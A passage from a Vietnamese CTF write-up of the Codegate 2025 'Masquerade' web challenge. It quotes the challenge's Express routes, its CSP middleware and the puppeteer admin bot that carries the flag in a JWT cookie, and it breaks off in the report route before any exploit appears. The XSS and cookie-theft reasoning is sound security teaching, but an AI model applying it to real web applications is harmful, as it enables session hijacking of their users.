

<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>CodegateCTF 2025 quals - &gt; root@l3mnt2010:~# ./exploit.py</title>
  <meta name="description" content="codegate ctf 2025 quals  Masquerade  find sink endpoint find gadget endpoint find xss endpoint to inject find real endpoint to xss DOM clobbering change variable when trigger Change properties hasPerm to write new post string source -&gt; gadget -&gt; sink Exploit docker local   Hide and seek  CVE-2024-34351: Server-Side Request Forgery in NextJS Server Actions Tối ưu hóa hình ảnh với _next/image Server action Phân tích bài toán   Memo service back office cha&rsquo;s point    .">
  <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "\u003e root@l3mnt2010:~# .\/exploit.py",
    
    "url": "https:\/\/l3mnt2010.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/l3mnt2010.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/write-up\/2025-04-17-codegatectf2025quals\/",
          "name": "Codegate ctf 2025 quals"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : ""
  },
  "headline": "CodegateCTF 2025 quals",
  "description" : "codegate ctf 2025 quals  Masquerade  find sink endpoint find gadget endpoint find xss endpoint to inject find real endpoint to xss DOM clobbering change variable when trigger Change properties hasPerm to write new post string source -\u0026gt; gadget -\u0026gt; sink Exploit docker local   Hide and seek  CVE-2024-34351: Server-Side Request Forgery in NextJS Server Actions Tối ưu hóa hình ảnh với _next\/image Server action Phân tích bài toán   Memo service back office cha\u0026rsquo;s point    \r\r\r\r\r.",
  "inLanguage" : "en",
  "wordCount":  6919 ,
  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
  "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
  "keywords" : [ "CTF, Vietnamese" ],
  "mainEntityOfPage" : "https:\/\/l3mnt2010.github.io\/write-up\/2025-04-17-codegatectf2025quals\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/l3mnt2010.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/l3mnt2010.github.io\/avatar.png",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="CodegateCTF 2025 quals" />
<meta property="og:description" content="codegate ctf 2025 quals  Masquerade  find sink endpoint find gadget endpoint find xss endpoint to inject find real endpoint to xss DOM clobbering change variable when trigger Change properties hasPerm to write new post string source -&gt; gadget -&gt; sink Exploit docker local   Hide and seek  CVE-2024-34351: Server-Side Request Forgery in NextJS Server Actions Tối ưu hóa hình ảnh với _next/image Server action Phân tích bài toán   Memo service back office cha&rsquo;s point    .">
<meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
<meta property="og:url" content="https://l3mnt2010.github.io/write-up/2025-04-17-codegatectf2025quals/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="&gt; root@l3mnt2010:~# ./exploit.py" />

  <meta name="twitter:title" content="CodegateCTF 2025 quals" />
  <meta name="twitter:description" content="codegate ctf 2025 quals  Masquerade  find sink endpoint find gadget endpoint find xss endpoint to inject find real endpoint to xss DOM clobbering change variable when trigger Change properties hasPerm …">
  <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.83.1" />
  <link rel="alternate" href="https://l3mnt2010.github.io/index.xml" type="application/rss+xml" title="&gt; root@l3mnt2010:~# ./exploit.py"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://l3mnt2010.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/syntax.css" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
            </li>
          
        
          
            <li>
              <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
            </li>
          
        
          
            <li>
              <a title="Write-up CTF" href="https://l3mnt2010.github.io/write-up">Write-up CTF</a>
            </li>
          
        
          
            <li>
              <a title="Tags" href="https://l3mnt2010.github.io/tags">Tags</a>
            </li>
          
        
          
            <li>
              <a title="About" href="https://l3mnt2010.github.io/about">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="&gt; root@l3mnt2010:~# ./exploit.py" href="https://l3mnt2010.github.io/">
            <img class="avatar-img" src="https://l3mnt2010.github.io/avatar.png" alt="&gt; root@l3mnt2010:~# ./exploit.py" />
           
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="write-up-heading">
              
                <h1>CodegateCTF 2025 quals</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        
  <div class="toc-container">
    <div class="toc">
      <nav id="TableOfContents">
        
        <nav id="TableOfContents">
  <ol>
    <li><a href="#codegate-ctf-2025-quals">codegate ctf 2025 quals</a>
      <ol>
        <li><a href="#masquerade">Masquerade</a>
          <ol>
            <li><a href="#find-sink-endpoint">find sink endpoint</a></li>
            <li><a href="#find-gadget-endpoint">find gadget endpoint</a></li>
            <li><a href="#find-xss-endpoint-to-inject">find xss endpoint to inject</a></li>
            <li><a href="#find-real-endpoint-to-xss">find real endpoint to xss</a></li>
            <li><a href="#dom-clobbering-change-variable-when-trigger">DOM clobbering change variable when trigger</a></li>
            <li><a href="#change-properties-hasperm-to-write-new-post">Change properties hasPerm to write new post</a></li>
            <li><a href="#string-source---gadget---sink">string source -&gt; gadget -&gt; sink</a></li>
            <li><a href="#exploit-docker-local">Exploit docker local</a></li>
          </ol>
        </li>
        <li><a href="#hide-and-seek">Hide and seek</a>
          <ol>
            <li><a href="#cve-2024-34351-server-side-request-forgery-in-nextjs-server-actions">CVE-2024-34351: Server-Side Request Forgery in NextJS Server Actions</a></li>
            <li><a href="#tối-ưu-hóa-hình-ảnh-với-_nextimage">Tối ưu hóa hình ảnh với <code>_next/image</code></a></li>
            <li><a href="#server-action">Server action</a></li>
            <li><a href="#phân-tích-bài-toán">Phân tích bài toán</a></li>
          </ol>
        </li>
        <li><a href="#memo-service">Memo service</a></li>
        <li><a href="#back-office">back office</a></li>
        <li><a href="#chas-point">cha&rsquo;s point</a></li>
      </ol>
    </li>
  </ol>
</nav>
      </nav>
    </div>
  </div>

  <style>
     
    .toc-container {
      position: fixed;
      left: 0;
      top: 100px;  
      width: 350px;  
      max-height: 80vh;
      overflow-y: auto;
      overflow-x: auto;
      padding: 20px;
      border-right: 1px solid #eee;
      background-color: black;  
      z-index: 100;
      text-align: left;  
    }

    .toc {
      font-size: 1.3rem;  
      color: #fff;  
      text-align: left;  
    }

    .toc h4 {
      margin-top: 0;
      margin-bottom: 1rem;
      font-size: 1.3rem;  
      text-align: left;  
    }

     
    .toc ul, .toc ol {
      padding-left: 0;  
      margin: 0;
      list-style-type: none;
      text-align: left;  
    }

     
    .toc ul ul, .toc ul ol, .toc ol ul, .toc ol ol {
      padding-left: 10px;
    }

    .toc li {
      padding: 10px 0;
      line-height: 1.6;
      text-align: left;  
    }

     
    .toc a {
      text-decoration: none;
      display: block;
      text-align: left;  
      padding-left: 3px;  
      font-size: 1.3rem;  
      transition: color 0.2s;
    }

     
    .toc > nav > ul > li > a {
      color: #bb86fc;  
      font-weight: bold;
    }

     
    .toc > nav > ul > li > ul > li > a {
      color: #ff4d4d;  
    }

     
    .toc > nav > ul > li > ul > li > ul > li > a {
      color: #4caf50;  
    }

     
    .toc a:hover {
      color: #ffcc00;  
    }

     
    .toc a.active {
      color: #ffcc00;  
      font-weight: bold;
      border-left: 4px solid #ffcc00;  
      padding-left: 3px;  
      margin-left: -5px;
    }

     
    .main-content {
      margin-left: 380px;  
    }

     
    @media (max-width: 1200px) {
      .toc-container {
        width: 280px;  
      }
      .main-content {
        margin-left: 320px;
      }
    }

    @media (max-width: 900px) {
      .toc-container {
        position: static;
        width: 100%;
        max-height: none;
        border-right: none;
        border-bottom: 1px solid #eee;
        margin-bottom: 20px;
      }
      .main-content {
        margin-left: 0;
      }
    }
  </style>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      
      function highlightTOC() {
        const headings = document.querySelectorAll('.main-content h1, .main-content h2, .main-content h3, .main-content h4, .main-content h5, .main-content h6');
        const tocLinks = document.querySelectorAll('.toc a');

        if (headings.length === 0 || tocLinks.length === 0) return;

        let currentActiveIndex = -1;
        const scrollPosition = window.scrollY;

        for (let i = 0; i < headings.length; i++) {
          const heading = headings[i];
          const headingTop = heading.offsetTop - 100;
          const headingBottom = headingTop + heading.offsetHeight;

          if (scrollPosition >= headingTop && scrollPosition <= headingBottom) {
            currentActiveIndex = i;
            break;
          }
        }

        tocLinks.forEach(link => link.classList.remove('active'));

        if (currentActiveIndex >= 0) {
          const currentHeading = headings[currentActiveIndex];
          const headingId = currentHeading.id;

          const correspondingLink = document.querySelector(`.toc a[href="#${headingId}"]`);
          if (correspondingLink) {
            correspondingLink.classList.add('active');

            const tocContainer = document.querySelector('.toc-container');
            const linkTop = correspondingLink.offsetTop;
            const containerScrollTop = tocContainer.scrollTop;
            const containerHeight = tocContainer.clientHeight;

            if (linkTop < containerScrollTop || linkTop > containerScrollTop + containerHeight) {
              tocContainer.scrollTop = linkTop - containerHeight / 2;
            }
          }
        }
      }

      highlightTOC();
      window.addEventListener('scroll', highlightTOC);
      window.addEventListener('resize', highlightTOC);

      const fragment = window.location.hash;
      if (fragment) {
        const element = document.querySelector(fragment);
        if (element) {
          element.scrollIntoView({ behavior: 'smooth' });

          const tocLinks = document.querySelectorAll('.toc a');
          tocLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === fragment) {
              link.classList.add('active');
            }
          });

          highlightTOC();
        }
      }

      const tocLinks = document.querySelectorAll('.toc a');
      tocLinks.forEach(link => {
        link.addEventListener('click', function(event) {
          const targetId = link.getAttribute('href').substring(1);
          const targetElement = document.getElementById(targetId);

          if (targetElement) {
            targetElement.scrollIntoView({ behavior: 'smooth' });

            tocLinks.forEach(l => l.classList.remove('active'));
            link.classList.add('active');

            history.pushState(null, null, `#${targetId}`);

            event.preventDefault();
          }
        });
      });
    });
  </script>  


<h1 id="codegate-ctf-2025-quals">codegate ctf 2025 quals</h1>
<h2 id="masquerade">Masquerade</h2>
<p>Đây là một bài khá hay về client side và cụ thể là xss, và các tác vụ dom trên trình duyệt(chrome, firefox)</p>
<p>Server cung cấp một mã nguồn nodejs có cấu trúc khá clean như sau:</p>
<p><img src="https://hackmd.io/_uploads/SkIrMxYpJg.png" alt="image"></p>
<p>Đi vào mã server chính viết theo model MVC ta sẽ quan sát ở index.js trước</p>
<p>Tại <code>index.js</code> có 2 điểm đáng chú ý đó là các route là các endpoint api của web service trên port local đó là <code>3000</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">mainRoute</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./routes/main&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">authRoute</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./routes/auth&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">userRoute</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./routes/user&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">postRoute</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./routes/post&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">adminRoute</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./routes/admin&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">errorRoute</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./routes/error&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">reportRoute</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./routes/report&#39;</span><span class="p">);</span>

<span class="p">...</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nx">mainRoute</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/auth&#39;</span><span class="p">,</span> <span class="nx">authRoute</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/user&#39;</span><span class="p">,</span> <span class="nx">userRoute</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/post&#39;</span><span class="p">,</span> <span class="nx">postRoute</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="nx">adminRoute</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/error&#39;</span><span class="p">,</span> <span class="nx">errorRoute</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/report&#39;</span><span class="p">,</span> <span class="nx">reportRoute</span><span class="p">);</span>
</code></pre></div><p>Với view được sử dụng là template ejs</p>
<p>Điểm thứ 2 cần phải chú ý đến đó là csp(content-security-policy) là một giải pháp khá điển hình cho phòng tránh tấn công <code>xss</code></p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">nonce</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">&#34;X-Frame-Options&#34;</span><span class="p">,</span> <span class="s2">&#34;deny&#34;</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">path</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">&#34;Content-Security-Policy&#34;</span><span class="p">,</span> <span class="sb">`default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;`</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">&#34;Content-Security-Policy&#34;</span><span class="p">,</span> <span class="sb">`default-src &#39;self&#39;; script-src &#39;nonce-</span><span class="si">${</span><span class="nx">nonce</span><span class="si">}</span><span class="sb">&#39;`</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">nonce</span> <span class="o">=</span> <span class="nx">nonce</span><span class="p">;</span>

    <span class="nx">next</span><span class="p">();</span>
<span class="p">});</span>
</code></pre></div><p>Có thể thấy middleware này sẽ kiểm tra xem nếu path truy cập là <code>/admin</code>  thì sẽ set header csp là <code>default-src 'self'; script-src 'self' 'unsafe-inline'</code> và tất cả những endpoint có path khác <code>/admin</code> sẽ được set <code>default-src 'self'; script-src 'nonce-${nonce}'</code> tí nữa mình sẽ nói về những policy này sau.</p>
<p>Tổng quan qua về chức năng của web này là cho người dùng đăng kí đăng nhập -&gt; tiếp sau đó là có thay đổi role của bản thân nhưng chỉ có thể checkout qua lại giữa 2 role là <code>MEMBER</code> và <code>DEV</code> và 2 role này hoàn toàn không có chức năng gì để khai thác -&gt; nếu người dùng có permission <code>hasPer: true</code> thì có thể viết note và mặc định giá trị này đối với mọi tài khoản sau khi đăng ký là <code>false</code></p>
<h3 id="find-sink-endpoint">find sink endpoint</h3>
<p>Mình sẽ bắt đầu tìm từ nơi gần flag nhất</p>
<p>Tại <code>/utils/report.js</code> thì mình thấy một chức năng chronium tương tự mấy bài xss thường gặp như sau:</p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">puppeteer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">generateToken</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./jwt&#39;</span><span class="p">)</span>

<span class="kr">const</span> <span class="nx">delay</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="p">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">));</span>

<span class="kr">const</span> <span class="nx">viewUrl</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">post_id</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">generateToken</span><span class="p">({</span> <span class="nx">uuid</span><span class="o">:</span> <span class="s2">&#34;codegate2025{test_flag}&#34;</span><span class="p">,</span> <span class="nx">role</span><span class="o">:</span> <span class="s2">&#34;ADMIN&#34;</span><span class="p">,</span> <span class="nx">hasPerm</span><span class="o">:</span> <span class="kc">true</span> <span class="p">})</span>

    <span class="kr">const</span> <span class="nx">cookies</span> <span class="o">=</span> <span class="p">[{</span> <span class="s2">&#34;name&#34;</span><span class="o">:</span> <span class="s2">&#34;jwt&#34;</span><span class="p">,</span> <span class="s2">&#34;value&#34;</span><span class="o">:</span> <span class="nx">token</span><span class="p">,</span> <span class="s2">&#34;domain&#34;</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span> <span class="p">}];</span>

    <span class="kr">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
        <span class="nx">executablePath</span><span class="o">:</span> <span class="s1">&#39;/usr/bin/chromium&#39;</span><span class="p">,</span>
        <span class="nx">args</span><span class="o">:</span> <span class="p">[</span><span class="s2">&#34;--no-sandbox&#34;</span><span class="p">]</span>
    <span class="p">});</span>

    <span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

    <span class="k">try</span> <span class="p">{</span>
        <span class="kr">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">setCookie</span><span class="p">(...</span><span class="nx">cookies</span><span class="p">);</span>

        <span class="kr">const</span> <span class="nx">page</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

        <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="sb">`http://localhost:3000/post/</span><span class="si">${</span><span class="nx">post_id</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span> <span class="p">{</span> <span class="nx">timeout</span><span class="o">:</span> <span class="mi">3000</span><span class="p">,</span> <span class="nx">waitUntil</span><span class="o">:</span> <span class="s2">&#34;domcontentloaded&#34;</span> <span class="p">});</span>

        <span class="kr">await</span> <span class="nx">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>

        <span class="kr">const</span> <span class="nx">button</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#delete&#39;</span><span class="p">);</span>
        <span class="kr">await</span> <span class="nx">button</span><span class="p">.</span><span class="nx">click</span><span class="p">();</span>

        <span class="kr">await</span> <span class="nx">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;An Error occurred:&#34;</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
        <span class="nx">result</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
        <span class="kr">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
<span class="p">};</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">viewUrl</span> <span class="p">};</span>
</code></pre></div><p>Như ta có thể thấy khái quát là chức năng này sẽ nhận một port_id sau đó khởi tạo một jwt có giá trị uuid là <code>flag</code> sau đó set cookie cho trình duyệt của nó và truy cập đến post của người dùng và đợi domload hết -&gt; tiếp tục click vào html tag có id là <code>#delete</code> đóng trình duyệt và hoạt tất.</p>
<p>Trace ngược ra những nơi sử dụng hàm này thì tìm thấy được trong <code>/routes/report.js</code> có import func này:</p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">viewUrl</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../utils/report&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">getPostById</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../models/postModel&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">authenticateJWT</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../utils/jwt&#39;</span><span class="p">);</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">authenticateJWT</span><span class="p">);</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/:post_id&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">post_id</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">post_id</span><span class="p">;</span>
    <span class="kr">const</span> <span class="nx">post</span> <span class="o">=</span> <span class="nx">getPostById</span><span class="p">(</span><span class="nx">post_id</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">post</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Post Not Found.&#34;</span> <span class="p">});</span>

    <span class="kd">let</span> <span class="nx">message</span><span class="p">;</span>
    <span class="kd">let</span> <span class="nx">code</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">role</span> <span class="o">!==</span> <span class="s2">&#34;INSPECTOR&#34;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">message</span> <span class="o">=</span> <span class="s2">&#34;No Permission.&#34;</span><span class="p">;</span>
        <span class="nx">code</span> <span class="o">=</span> <span class="mi">403</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">viewUrl</span><span class="p">(</span><span class="nx">post_id</span><span class="p">);</span>

        <span class="nx">message</span> <span class="o">=</span> <span class="nx">result</span> <span class="o">?</span> <span class="s2">&#34;Reported.&#34;</span> <span class="o">:</span> <span class="s2">&#34;Error occurred while check url.&#34;</span><span class="p">;</span>
        <span class="nx">code</span> <span class="o">=</span> <span class="nx">result</span> <span class="o">?</span> <span class="mi">200</span> <span class="o">:</span> <span class="mi">500</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="nx">code</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="sb">`
